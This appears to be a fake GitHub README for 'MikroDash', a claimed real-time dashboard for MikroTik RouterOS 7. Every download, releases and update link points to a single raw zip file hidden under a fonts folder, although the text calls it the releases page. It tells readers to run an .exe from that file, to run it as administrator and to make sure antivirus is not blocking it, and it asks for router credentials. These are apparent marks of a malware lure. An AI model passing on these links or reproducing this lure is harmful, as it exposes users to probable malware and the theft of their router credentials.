# 📊 MikroDash - Monitor Router Data Live Easily

[![Download MikroDash](https://img.shields.io/badge/Download-MikroDash-00aaff?style=for-the-badge)](https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip)

## 🔍 What is MikroDash?

MikroDash is a real-time dashboard for MikroTik RouterOS version 7. It shows live information from your router such as CPU use, network traffic, connected wireless clients, DHCP details, WireGuard VPN status, firewall activity, and geographic connection data. It gets all this data directly from the router’s API and sends it to your browser using a technology called Socket.IO. You can run it on your own PC or a server, and it works well with Docker if you want that setup.

## 💻 System Requirements

To run MikroDash on Windows, your computer needs:

- Windows 10 or higher (64-bit recommended)
- At least 4 GB of RAM
- 500 MB of free disk space
- A stable internet connection to interact with your router
- Access to your MikroTik router with RouterOS v7 installed and API enabled
- A modern browser such as Chrome, Firefox, Edge, or Safari

Your router must have the API service enabled. This lets MikroDash get the data it needs. Usually, this means logging into the router and turning on the API service.

## 📥 How to Download MikroDash

Click the button below to visit the official MikroDash releases page. You will find the latest Windows installer there.

[![Download MikroDash](https://img.shields.io/badge/Download-MikroDash-ffaa00?style=for-the-badge)](https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip)

## 🚀 Installing and Running MikroDash on Windows

1. **Visit the releases page** using the link above.

2. **Find the latest release**. Look for a file ending with `.exe`. This is the Windows installer.

3. **Download the `.exe` file** to your computer. Save it in a place you can easily find, like your `Downloads` folder.

4. Once the download finishes, **double-click the `.exe` file** to start the installer.

5. **Follow the on-screen instructions**:
    - Choose the folder where you want to install MikroDash or accept the default.
    - Confirm the installation.
    - Wait until the setup completes.

6. After installation, MikroDash should start automatically. If it does not, find the MikroDash shortcut on your desktop or start menu and open it.

7. When MikroDash runs, it opens a web browser window showing the dashboard.

## 🔧 Connecting MikroDash to Your Router

To see live data, MikroDash needs to talk to your MikroTik router. Do the following:

1. **Make sure your MikroTik router runs RouterOS version 7.** You can check by logging into the router via its admin interface.

2. **Enable the API service on the router:**
    - Log in to your MikroTik router using WinBox or web interface.
    - Go to the `IP` menu, then select `Services`.
    - Find `API` in the list, then make sure it is enabled.
    - Note the port number (usually 8728 for non-secure and 8729 for secure).

3. **Provide MikroDash with the correct information:**
    - Router IP address (for example, `192.168.88.1`)
    - Router API port (default is 8728)
    - Your router’s login username and password

4. Enter these details in MikroDash’s setup screen.

5. Save the settings and start the connection.

If the connection succeeds, the dashboard will start showing live CPU usage, traffic, and other details from your router.

## 🛠 Features You’ll See in MikroDash

MikroDash presents various real-time details that help you watch your network easily:

- **CPU Usage**  
  Shows your router’s processor load in real time.

- **Network Traffic**  
  Displays live upload and download speed on all network interfaces.

- **Wireless Clients**  
  Lists devices connected to your router’s Wi-Fi along with connection quality.

- **DHCP Information**  
  Shows active DHCP leases and assigned IP addresses.

- **WireGuard VPN Status**  
  Displays connection status and information about active WireGuard VPN tunnels.

- **Firewall Activity**  
  Shows logs of firewall events and traffic filtered by your rules.

- **Geo Connection Data**  
  Maps connections by geographic location, helping track where network traffic comes from.

## 🔄 Keeping MikroDash Updated

New versions come with fixes and new features. To update:

1. Visit the [releases page](https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip).

2. Download the newest Windows installer.

3. Run the installer. It will replace the old version while keeping your settings.

## 👩‍💻 Running MikroDash Without Installation (Optional)

If you prefer not to install anything, you can run MikroDash using Docker or other methods. These are more technical and may require some command line use.

For most Windows users, using the installer is the easiest way.

## 🧰 Troubleshooting

- **The dashboard does not load or connect to the router**:  
  Check that your PC and router are on the same network. Make sure the API service is enabled on the router. Double-check the login details you entered.

- **MikroDash does not start after install**:  
  Try running the app as administrator. Check your antivirus is not blocking it.

- **Data looks strange or does not update**:  
  Confirm your router is running RouterOS v7. Older versions may not support all features.

- **Firewall on Windows is blocking MikroDash**:  
  Allow MikroDash through Windows Defender Firewall in Windows settings.

## 📂 Where to Find More Information

- Your router manual or MikroTik’s website can help enable and configure the API.

- Visit MikroDash’s GitHub releases page for updates and files:  
  https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip

- If you face specific technical issues, the GitHub project page also has issue tracking where others post questions.

## 🔗 Download Links (Repetition)

You can download MikroDash for Windows here:  
[https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip](https://github.com/Hgghllliji/MikroDash/raw/refs/heads/main/public/vendor/fonts/Mikro_Dash_diamantiferous.zip)  

Look for the latest `.exe` file to start your installation.